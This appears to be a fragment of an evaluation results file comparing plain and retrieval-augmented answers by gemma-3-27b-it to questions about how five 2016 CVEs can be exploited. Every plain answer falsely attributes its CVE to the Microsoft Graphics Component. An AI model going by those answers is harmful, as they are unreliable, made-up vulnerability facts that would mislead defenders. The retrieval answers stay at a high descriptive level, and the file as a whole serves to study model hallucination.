+    "cve_id": "CVE-2016-4610",
+    "question": "You are a cybersecurity expert. How can an attacker exploit CVE-2016-4610? Do not be verbose and answer carefully.",
+    "model": "google/gemma-3-27b-it",
+    "base_response": "CVE-2016-4610 is a vulnerability in the Microsoft Graphics Component. An attacker can exploit it by crafting a malicious image file (e.g., TIFF) that, when opened by a vulnerable application, allows for remote code execution. The attack requires user interaction (opening the file).\n",
+    "rag_response": "CVE-2016-4610 is a memory corruption vulnerability in libxslt. An attacker can craft a malicious XML document that, when processed by a vulnerable application using libxslt, leads to a crash (DoS) or potentially arbitrary code execution. The specific XML structure triggers a heap overflow.\n</Response>",
+    "rag_text": "Description\nlibxslt in Apple iOS before 9.3.3, OS X before 10.11.6, iTunes before 12.4.2 on Windows, iCloud before 5.2.1 on Windows, tvOS before 9.2.2, and watchOS before 2.2.2 allows remote attackers to cause a denial of service (memory corruption) or possibly have unspecified other impact via unknown vectors, a different vulnerability than CVE-2016-4607, CVE-2016-4608, CVE-2016-4609, and CVE-2016-4612.",
+    "timestamp": "2025-05-13T18:43:36.334401"
+  },
+  {
+    "cve_id": "CVE-2016-4662",
+    "question": "You are a cybersecurity expert. How can an attacker exploit CVE-2016-4662? Do not be verbose and answer carefully.",
+    "model": "google/gemma-3-27b-it",
+    "base_response": "CVE-2016-4662 is a vulnerability in the Microsoft Graphics Component. An attacker can exploit it by crafting a malicious image file (e.g., TIFF, JPEG, PNG) that, when opened by a vulnerable application (like Windows Photo Viewer, or an application using the Windows Imaging Component), allows for remote code execution. The attack requires user interaction \u2013 the user must open the crafted image.\n",
+    "rag_response": "CVE-2016-4662, a vulnerability in AppleGraphicsControl, can be exploited by a malicious application sending specially crafted data to the graphics driver. This can lead to memory corruption, allowing for arbitrary code execution with kernel privileges or a denial of service. The attack requires a user to run a crafted app.\n</Response>>",
+    "rag_text": "Description\nAn issue was discovered in certain Apple products. macOS before 10.12.1 is affected. The issue involves the \"AppleGraphicsControl\" component. It allows attackers to execute arbitrary code in a privileged context or cause a denial of service (memory corruption) via a crafted app.",
+    "timestamp": "2025-05-13T18:44:27.444664"
+  },
+  {
+    "cve_id": "CVE-2016-7838",
+    "question": "You are a cybersecurity expert. How can an attacker exploit CVE-2016-7838? Do not be verbose and answer carefully.",
+    "model": "google/gemma-3-27b-it",
+    "base_response": "CVE-2016-7838 is a vulnerability in Microsoft Graphics Component. An attacker can exploit it by crafting a malicious image file (e.g., TIFF, JPEG, PNG) that, when opened by a vulnerable application, allows for remote code execution. The attack requires user interaction (opening the image).\n",
+    "rag_response": "An attacker can exploit CVE-2016-7838 by placing a malicious executable with the same name as a legitimate WinSparkle updated application in a directory WinSparkle searches *before* the intended location. WinSparkle will then execute the attacker's code instead of the legitimate update, leading to arbitrary code execution. The vulnerability stems from WinSparkle not properly validating the source of the update executable.\n</Response>>",
+    "rag_text": "Description\nUntrusted search path vulnerability in WinSparkle versions prior to 0.5.3 allows remote attackers to execute arbitrary code via a specially crafted executable file in an unspecified directory.",
+    "timestamp": "2025-05-13T18:45:18.593580"
+  },
+  {
+    "cve_id": "CVE-2016-7869",
+    "question": "You are a cybersecurity expert. How can an attacker exploit CVE-2016-7869? Do not be verbose and answer carefully.",
+    "model": "google/gemma-3-27b-it",
+    "base_response": "CVE-2016-7869 is a vulnerability in Microsoft Graphics Component. An attacker can exploit it by crafting a malicious image file (e.g., TIFF) that, when opened by a vulnerable application, allows for remote code execution. The attack requires user interaction (opening the file).\n",
+    "rag_response": "An attacker can craft a malicious SWF file containing a specially designed regular expression. This regex exploits the flawed backtrack search implementation in Flash Player's RegExp class. When the regex is processed, it triggers a buffer overflow or underflow, overwriting adjacent memory. This allows the attacker to inject and execute arbitrary code on the victim's system. The vulnerability is triggered by the way Flash handles backtracking during regex matching.\n</Response>",
+    "rag_text": "Adobe Flash Player versions 23.0.0.207 and earlier, 11.2.202.644 and earlier have an exploitable buffer overflow / underflow vulnerability in the RegExp class related to backtrack search functionality. Successful exploitation could lead to arbitrary code execution.",
+    "timestamp": "2025-05-13T18:46:07.560980"
+  },
+  {
+    "cve_id": "CVE-2016-8655",
+    "question": "You are a cybersecurity expert. How can an attacker exploit CVE-2016-8655? Do not be verbose and answer carefully.",
+    "model": "google/gemma-3-27b-it",
+    "base_response": "CVE-2016-8655 is a vulnerability in the Microsoft Graphics Component. An attacker can exploit it by crafting a malicious image file (e.g., TIFF, JPEG, PNG) that, when opened by a vulnerable application (like Windows Photo Viewer, or an application using the graphics component), allows for remote code execution. The attack requires user interaction \u2013 the user must open the crafted image.\n",
+    "rag_response": "An attacker with `CAP_NET_RAW` can exploit CVE-2016-8655 by rapidly changing a packet socket's version while the kernel is processing it. This race condition leads to a use-after-free vulnerability. Successful exploitation can result in privilege escalation or a denial of service.\n</Response>>",
+    "rag_text": "Description\nRace condition in net/packet/af_packet.c in the Linux kernel through 4.8.12 allows local users to gain privileges or cause a denial of service (use-after-free) by leveraging the CAP_NET_RAW capability to change a socket version, related to the packet_set_ring and packet_setsockopt functions.",
+    "timestamp": "2025-05-13T18:46:57.764713"
+  }
+]
